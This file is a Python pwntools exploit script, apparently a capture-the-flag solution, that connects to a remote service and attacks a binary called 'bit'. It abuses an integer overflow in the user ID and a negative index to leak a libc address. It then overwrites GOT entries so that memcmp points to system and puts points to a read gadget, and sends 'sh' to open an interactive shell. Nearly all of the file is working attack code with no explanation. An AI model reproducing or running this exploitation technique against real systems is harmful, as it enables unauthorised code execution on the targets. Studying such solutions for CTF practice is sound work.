#!/usr/bin/python
from pwn import *

#p = process("./bit")
p = remote("128.199.135.210", 31335)
#raw_input()
p.recvuntil("password:")
p.sendline("1")

p.recvuntil("user_id:")
p.sendline("-2147483699")

p.recvuntil("sort ?")
p.sendline("127")

p.recvuntil("integers")

numbers = '''
1
1
1
1
1

1
1
1
1
1

1
1
1

1
1
1
1

1
1
1

1
1
1

1
1
1
1

1
1
1
1

1
1
1
1

1
1
1
1
1

1
1
1
1

1
1
1
1

1
1
1
1

1
1
1
1

1
1
1
1
1

1
1
1
1
1

1
1
1
1

1
1
1
1

1
1
1
1

1
1
1
1

1
1
1
7
8
9
1
2
3
4
5
6
7
8
9
11
12
13
14
14
11
22
33
44
55
66
77
88
99
23
34
45
56
67
87
98
87
76
65
54
43
66
67
68
69
'''
p.sendline(numbers)

p.recvuntil("break")
#p.interactive()
# Leak libc.
p.clean()
p.sendline("-20")
#p.interactive()
print p.recv()
libc = int(p.recv(),16)
#libc = libc - 0x49670
libc = libc - 0x49f30
log.success("Libc : " + str(hex(libc))) # printf
# Check.
#one_shot = libc + 0x3ada0
system_addr = libc + 0x3b020

p.sendline("-1")
p.recvuntil("find")
p.sendline("1879048191")

i = 0
p.recvuntil("!!!")
p.sendline("n")
# Overwrite GOT entry of puts with one_shot.
for i in range(0,21):
	p.recvuntil("it ?")
	p.sendline("n")
p.recvuntil("it ?")
p.sendline("y")
p.recvuntil("value")
lol1 = 0x0804860f # read() just before memcmp()
p.sendline(str(system_addr)) # memcmp
p.recvuntil("it ?")
p.sendline("y")
p.recvuntil("value")
finale = system_addr
p.sendline(str(lol1)) # puts
raw_input()
p.sendline("ABCDEFGHIJKLMNOPsh\x00\x00")
p.interactive()
